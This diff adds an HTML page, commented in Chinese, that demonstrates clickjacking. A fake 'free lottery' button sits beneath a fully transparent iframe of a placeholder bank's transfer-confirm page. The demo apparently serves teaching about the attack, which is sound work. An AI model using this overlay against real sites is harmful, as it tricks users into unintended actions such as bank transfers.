@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        /* 1. 攻击者自己做的诱导层（在底层） */
+        .underlay-game {
+            position: absolute;
+            top: 50px;
+            left: 50px;
+            width: 300px;
+            height: 150px;
+            background-color: #ff4757;
+            color: white;
+            text-align: center;
+            line-height: 150px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 8px;
+            z-index: 1;
+            /* 层级较低 */
+        }
+
+        /* 2. 被嵌入的真实网站 iframe（在顶层，且完全透明） */
+        .hijack-iframe {
+            position: absolute;
+            top: 100px;
+            /* 精确调整位置，使“确认”按钮对齐下方的“抽奖”位置 */
+            left: 120px;
+            width: 150px;
+            height: 50px;
+
+            /* 核心配合样式 */
+            z-index: 9999;
+            /* 必须在最顶层，抢夺点击事件 */
+            opacity: 0;
+            /* 设为 0 (完全透明)，使用户看不见它 */
+
+            border: none;
+            cursor: pointer;
+            /* 甚至可以改变鼠标指针，让用户毫无防备 */
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- 视觉上用户看到的：一个好玩的抽奖按钮 -->
+    <div class="underlay-game">
+        点击这里 ➔ 免费抽奖！
+    </div>
+
+    <!-- 实际上覆盖在最上层的：受害者第三方网站（比如银行转账的“确认”按钮） -->
+    <!-- 页面因为 opacity: 0 隐形了，但它依然能接收点击 -->
+    <iframe class="hijack-iframe" src="https://vulnerable-bank.com/transfer-confirm-button"></iframe>
+
+</body>
+
+</html>
